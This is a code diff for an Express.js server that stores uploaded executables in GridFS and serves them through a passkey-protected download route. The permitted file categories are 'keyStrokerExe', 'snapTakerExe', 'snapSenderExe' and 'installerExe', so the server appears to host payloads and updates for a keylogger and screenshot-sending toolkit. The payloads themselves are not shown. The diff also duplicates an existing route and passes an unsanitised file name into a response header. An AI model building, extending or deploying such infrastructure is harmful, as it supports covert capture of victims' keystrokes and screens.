@@ -1066,6 +1066,152 @@ app.post('/remove/:category', async (req, res) => {
   res.redirect('/updater');
 });
 
+app.post('/finalize-upload/:category', async (req, res) => {
+  const start = Date.now();
+
+  if (!req.session.user) {
+    console.log('Unauthorized finalization attempt for category:', req.params.category);
+    return res.status(401).send('Unauthorized');
+  }
+
+  const category = req.params.category;
+  console.log(`[${new Date().toISOString()}] Starting finalization for user: ${req.session.user}, category: ${category}`);
+
+  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
+    console.log(`Invalid category finalization attempt: ${category}`);
+    return res.status(400).send('Invalid category');
+  }
+
+  const { originalName } = req.body;
+  const userId = req.session.user;
+  const storageKey = `${userId}-${category}`;
+
+  // Retrieve chunks from memory
+  if (!chunkStorage.has(storageKey)) {
+    return res.status(400).send('No chunks found for this upload');
+  }
+
+  const storage = chunkStorage.get(storageKey);
+  const totalChunks = storage.totalChunks;
+  const chunks = storage.chunks;
+
+  // Verify all chunks are present
+  for (let i = 0; i < totalChunks; i++) {
+    if (!chunks[i]) {
+      return res.status(400).send(`Missing chunk ${i}`);
+    }
+  }
+
+  // Delete existing file if it exists (for updates)
+  const existingFile = await FileMetadata.findOne({ category, uploadedBy: req.session.user });
+  if (existingFile) {
+    console.log(`Deleting existing file: ${existingFile.filename}, category: ${category}, uploaded by: ${req.session.user}`);
+    await bucket.delete(existingFile.fileId);
+  }
+
+  // Reconstruct the file from chunks
+  const buffer = Buffer.concat(chunks);
+  const fileStream = Readable.from(buffer);
+
+  const hashStart = Date.now();
+  const hash = calculateHash(buffer);
+  console.log(`[${new Date().toISOString()}] Hash calculated in ${Date.now() - hashStart}ms`);
+
+  const uploadStream = bucket.openUploadStream(originalName, {
+    metadata: { uploadedBy: req.session.user, uploadDate: new Date(), category, hash }
+  });
+
+  fileStream.pipe(uploadStream);
+
+  uploadStream.on('finish', async () => {
+    const dbStart = Date.now();
+    await FileMetadata.findOneAndUpdate(
+      { category, uploadedBy: req.session.user },
+      { filename: originalName, fileId: uploadStream.id, uploadDate: new Date(), hash },
+      { upsert: true }
+    );
+    console.log(`[${new Date().toISOString()}] DB update in ${Date.now() - dbStart}ms`);
+
+    console.log(`[${new Date().toISOString()}] Finalization successful for user: ${req.session.user}, category: ${category}, file: ${originalName}, total time: ${Date.now() - start}ms`);
+
+    // Clean up memory
+    chunkStorage.delete(storageKey);
+
+    res.status(200).send('Upload finalized');
+  });
+
+  uploadStream.on('error', (err) => {
+    console.error(`GridFS upload error for user: ${req.session.user}, category: ${category}, file: ${originalName}`, err);
+    chunkStorage.delete(storageKey); // Clean up on error
+    res.status(500).send('Upload failed');
+  });
+});
+
+app.post('/remove/:category', async (req, res) => {
+  if (!req.session.user) {
+    console.log('Unauthorized remove attempt for category:', req.params.category);
+    return res.status(401).send('Unauthorized');
+  }
+
+  const category = req.params.category;
+  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
+    console.log(`Invalid category remove attempt: ${category}`);
+    return res.status(400).send('Invalid category');
+  }
+
+  console.log(`Starting removal for user: ${req.session.user}, category: ${category}`);
+  const file = await FileMetadata.findOne({ category, uploadedBy: req.session.user });
+  if (file) {
+    console.log(`Removing file: ${file.filename}, category: ${category}, uploaded by: ${req.session.user}`);
+    await bucket.delete(file.fileId);
+    await FileMetadata.deleteOne({ category, uploadedBy: req.session.user });
+  }
+  res.redirect('/updater');
+});
+
+// New download endpoint
+app.get('/download/:category/:uploadedBy', async (req, res) => {
+  const { category, uploadedBy } = req.params;
+  const { passkey } = req.query;
+
+  // Validate passkey
+  if (passkey !== process.env.DOWNLOAD_PASSKEY) {
+    console.log(`Invalid passkey attempt for category: ${category}, uploadedBy: ${uploadedBy}`);
+    return res.status(403).send('Forbidden');
+  }
+
+  // Validate category
+  if (!['keyStrokerExe', 'mainExecutableExe', 'snapTakerExe', 'snapSenderExe', 'xenoExecutorZip', 'installerExe'].includes(category)) {
+    console.log(`Invalid category download attempt: ${category}`);
+    return res.status(400).send('Invalid category');
+  }
+
+  try {
+    // Find file metadata
+    const fileMetadata = await FileMetadata.findOne({ category, uploadedBy });
+    if (!fileMetadata) {
+      console.log(`File not found for category: ${category}, uploadedBy: ${uploadedBy}`);
+      return res.status(404).send('File not found');
+    }
+
+    // Stream file from GridFS
+    const downloadStream = bucket.openDownloadStream(fileMetadata.fileId);
+    res.setHeader('Content-Type', 'application/octet-stream');
+    res.setHeader('Content-Disposition', `attachment; filename="${fileMetadata.filename}"`);
+
+    downloadStream.on('error', (err) => {
+      console.error(`Error streaming file ${fileMetadata.fileId}:`, err);
+      if (!res.headersSent) {
+        res.status(500).send('Error streaming file');
+      }
+    });
+
+    downloadStream.pipe(res);
+  } catch (err) {
+    console.error(`Error in download endpoint for category: ${category}, uploadedBy: ${uploadedBy}`, err);
+    res.status(500).send('Server error');
+  }
+});
 
 // Server Start
 app.listen(port, () => {
